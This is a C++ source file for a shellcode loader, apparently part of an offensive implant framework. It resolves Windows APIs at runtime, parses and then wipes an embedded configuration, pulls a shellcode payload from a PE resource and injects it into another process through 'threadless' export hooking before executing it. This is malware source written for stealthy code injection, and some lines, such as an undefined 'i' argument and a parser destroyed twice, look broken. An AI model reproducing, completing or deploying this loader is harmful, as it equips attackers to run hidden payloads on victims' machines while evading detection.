#include <inject/injectlib/injectlib.hpp>

TXT_SECTION(F) BYTE Config[512] = { };

VOID Entrypoint(HMODULE Base) {
    Memory::ContextInit();
    RsrcLoader(Base);
}

VOID RsrcLoader(HMODULE Base) {
        HEXANE

        PRSRC Rsrc          = { };
        PARSER Parser       = { };
        LPVOID Shellcode    = { };
        SIZE_T cbShellcode  = 0;
        SIZE_T ccbShellcode = 0;

        Memory::ResolveApi();
        Parser::CreateParser(&Parser, Config, sizeof(Config));
        x_memset(Config, 0, sizeof(Config));

        //XteaCrypt(B_PTR(Parser.Handle), Parser.Length, Ctx->ConfigBytes.Key, FALSE);

        Parser::ParserStrcpy(&Parser, RCAST(LPSTR*, &Ctx->Config.Key), nullptr);
        Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->Root), nullptr);
        Parser::ParserMemcpy(&Parser, RCAST(PBYTE*, &Ctx->LE), nullptr);

        THREADLESS Threadless = { };
        Parser::ParserStrcpy(&Parser, &Threadless.Parent.Buffer, &Threadless.Parent.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Module.Buffer, &Threadless.Module.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Export.Buffer, &Threadless.Export.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Opcode.Buffer, &Threadless.Opcode.Length);
        Parser::ParserStrcpy(&Parser, &Threadless.Loader.Buffer, &Threadless.Loader.Length);

        Parser::DestroyParser(&Parser);
        if (!(Rsrc = Memory::LdrGetIntResource(Base, IDR_RSRC_BIN1))) {
                return;
        }

        Shellcode = Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, Rsrc->Size);

        cbShellcode = Rsrc->Size;
        ccbShellcode = Threadless.Loader.Length + Rsrc->Size;

        MmPatchData(i, RCAST(PBYTE, Shellcode), (i), RCAST(PBYTE, Rsrc->ResLock), (i), cbShellcode);
        Ctx->win32.FreeResource(Rsrc->hGlobal);

        Injection::Threadless(Threadless, Shellcode, cbShellcode, ccbShellcode);

        if (Shellcode) {
                x_memset(Shellcode, 0, Rsrc->Size);
        }

        Parser::DestroyParser(&Parser);
        Execute();
}
